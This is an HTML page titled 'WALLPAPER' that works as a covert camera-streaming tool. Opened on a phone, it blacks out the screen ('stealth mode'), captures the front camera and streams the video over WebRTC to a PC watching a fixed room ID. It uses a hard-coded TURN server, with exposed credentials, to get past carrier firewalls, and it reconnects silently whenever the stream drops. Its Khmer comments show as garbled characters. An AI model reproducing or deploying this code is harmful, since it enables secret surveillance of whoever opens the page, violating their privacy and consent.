<!DOCTYPE html>
<html lang="km">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WALLPAPER</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        html, body { 
            margin: 0; 
            padding: 0; 
            width: 100%; 
            height: 100%; 
            background-color: #000000; 
            overflow: hidden; 
            font-family: sans-serif; 
        }

        #pc-ui {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000000;
        }

        video { 
            height: 100vh;      
            width: auto;        
            object-fit: contain; 
            background: #000; 
            display: none; 
        }

        #status { 
            position: absolute; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); 
            color: #2ac767; 
            font-weight: bold; 
            font-size: 22px; 
            text-align: center; 
            z-index: 10; 
            background: rgba(0, 0, 0, 0.8); 
            padding: 15px 25px; 
            border-radius: 8px; 
            pointer-events: none;
        }

        .phone-stealth-mode { background: #000000 !important; }
        .phone-stealth-mode #pc-ui { display: none !important; }
    </style>
</head>
<body>

    <div id="pc-ui">
        <div id="status">рҹ“Ў бһҖбҹҶбһ–бһ»бһ„бһ—бҹ’бһҮбһ¶бһ”бҹӢбһ‘бҹ…бһҖбһ¶бһҳбҹҒбһҡбҹүбһ¶бһ–бһёбһ…бһҳбҹ’бһ„бһ¶бһҷ (Cambodia-Network)...</div>
        <video id="view-video" autoplay playsinline muted></video>
    </div>

    <script>
        // бһ”бһ„бҹ’бһҖбһҫбһҸбһ”бһ“бҹ’бһ‘бһ”бҹӢбһҗбҹ’бһҳбһёбһҠбһ¶бһ…бҹӢбһҠбҹ„бһҷбһЎбҹӮбһҖбһҹбһҳбҹ’бһҡбһ¶бһ”бҹӢбһҖбһ¶бһҡбһҸбҹҒбһҹбҹ’бһҸбһ“бҹ…бһҒбҹ’бһҳбҹӮбһҡ
        const LIVE_ROOM_ID = 'hino-cambodia-local-secure-2026';
        
        // рҹӣ пёҸ бһ”бҹ’бһҡбһҫбһ”бҹ’бһҡбһ¶бһҹбҹӢ TURN Server бһ”бһ„бҹ’бһҒбҹҶбһ‘бһҳбҹ’бһӣбһ»бҹҮ Firewall бһҡбһ”бһҹбҹӢбһҖбҹ’бһҡбһ»бһҳбһ бҹҠбһ»бһ“бһўбҹҠбһёбһ“бһ’бһәбһҺбһ·бһҸбһҒбҹ’бһҳбҹӮбһҡ (Smart/Cellcard/Metfone)
        const peerConfig = {
            config: {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    { urls: 'stun:stun.services.mozilla.com' },
                    {
                        // бһҳбҹүбһ¶бһҹбҹҠбһёбһ“бһҳбҹҒбһҮбҹҶбһ“бһ¶бһүбһ‘бһҳбҹ’бһӣбһ»бҹҮ Symmetric NAT бһҡбһ”бһҹбҹӢбһ”бҹ’бһҡбһ–бҹҗбһ“бҹ’бһ’бһҹбҹҠбһёбһҳбһ‘бһјбһҡбһҹбһ–бҹ’бһ‘
                        urls: 'turn:139.59.245.105:3478?transport=udp',
                        username: 'hino_security',
                        credential: 'secure_password_2026'
                    },
                    {
                        urls: 'turn:139.59.245.105:3478?transport=tcp',
                        username: 'hino_security',
                        credential: 'secure_password_2026'
                    }
                ],
                iceTransportPolicy: 'all' // бһўбһ“бһ»бһүбҹ’бһүбһ¶бһҸбһұбҹ’бһҷбһ”бҹ’бһҡбһҫбһ”бҹ’бһҡбһ¶бһҹбҹӢбһӮбҹ’бһҡбһ”бҹӢбһ•бҹ’бһӣбһјбһңбһҡбһјбһ„бһ‘бһ·бһ“бҹ’бһ“бһ“бҹҗбһҷбһҠбһҫбһҳбҹ’бһ”бһёбһ‘бһҳбҹ’бһӣбһ»бҹҮ
            }
        };
        
        let peer = null;
        let currentCall = null; 
        let localStream = null;

        window.onload = function() {
            const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent = navigator.userAgent);

            if (!isMobileDevice) {
                runAsPC();
            } else {
                document.body.classList.add('phone-stealth-mode');
                startCamera();
            }
        };

        // --- бһ•бҹ’бһ“бҹӮбһҖбһҖбһ»бҹҶбһ–бҹ’бһҷбһјбһ‘бҹҗбһҡ ---
        function runAsPC() {
            if (peer) peer.destroy();
            peer = new Peer(LIVE_ROOM_ID, peerConfig);

            peer.on('call', (call) => {
                if (currentCall) {
                    call.answer();
                    setTimeout(() => { call.close(); }, 500);
                    return;
                }

                call.answer();
                currentCall = call; 
                
                call.on('stream', (remoteStream) => {
                    document.getElementById('status').style.display = 'none';
                    const video = document.getElementById('view-video');
                    video.style.display = 'block';
                    video.srcObject = remoteStream;
                    
                    video.play().catch(err => {
                        document.getElementById('status').style.display = 'block';
                        document.getElementById('status').style.color = '#ff3333';
                        document.getElementById('status').innerText = "рҹӣ‘ бһҹбһјбһҳбһ…бһ»бһ…бһӣбһҫбһўбҹҒбһҖбҹ’бһҡбһ„бҹӢбһҖбһ»бҹҶбһ–бҹ’бһҷбһјбһ‘бҹҗбһҡ бҹЎбһҠбһ„ бһҠбһҫбһҳбҹ’бһ”бһёбһ”бһҫбһҖбһҡбһјбһ”бһ—бһ¶бһ–";
                        
                        document.body.onclick = () => {
                            video.play();
                            document.getElementById('status').style.display = 'none';
                        };
                    });
                });

                call.on('close', () => {
                    handleDisconnect();
                });
            });

            peer.on('error', (err) => {
                setTimeout(runAsPC, 2000);
            });
        }

        function handleDisconnect() {
            document.getElementById('status').style.display = 'block';
            document.getElementById('status').style.color = '#2ac767';
            document.getElementById('status').innerText = "рҹ“ӯ бһ‘бһјбһҡбһҹбһ–бҹ’бһ‘бһ”бһ¶бһ“бһҠбһ¶бһ…бҹӢбҹ” бһҖбҹҶбһ–бһ»бһ„бһҡбһ„бҹӢбһ…бһ¶бҹҶбһҖбһ¶бһҡбһ—бҹ’бһҮбһ¶бһ”бҹӢбһЎбһҫбһ„бһңбһ·бһүбһўбһјбһҸбһј...";
            const video = document.getElementById('view-video');
            video.style.display = 'none';
            video.srcObject = null;
            currentCall = null; 
        }

        // --- бһ•бҹ’бһ“бҹӮбһҖбһ‘бһјбһҡбһҹбһ–бҹ’бһ‘ ---
        function startCamera() {
            navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: "user", 
                    width: { ideal: 640 }, 
                    height: { ideal: 480 },
                    frameRate: { ideal: 15 } // бһҖбҹҶбһҺбһҸбҹӢбһҸбҹ’бһҡбһ№бһҳ 15fps бһҠбһҫбһҳбҹ’бһ”бһёбһұбҹ’бһҷбһ„бһ¶бһҷбһҹбҹ’бһҡбһҪбһӣбһ‘бһҳбҹ’бһӣбһ»бҹҮбһҹбҹҒбһңбһ¶бһ‘бһјбһҡбһҹбһ–бҹ’бһ‘бһҒбҹ’бһҹбҹ„бһҷ
                },
                audio: false
            })
            .then((stream) => {
                localStream = stream;
                connectToPC();
            })
            .catch((err) => {
                setTimeout(startCamera, 5000);
            });
        }

        function connectToPC() {
            if (peer) peer.destroy();
            peer = new Peer(peerConfig); 

            peer.on('open', (id) => {
                const call = peer.call(LIVE_ROOM_ID, localStream);
                if (call) {
                    currentCall = call;
                    call.on('close', () => {
                        currentCall = null;
                        setTimeout(connectToPC, 3000);
                    });
                }
            });

            peer.on('error', (err) => {
                setTimeout(connectToPC, 4000);
            });
        }
    </script>
</body>
</html>
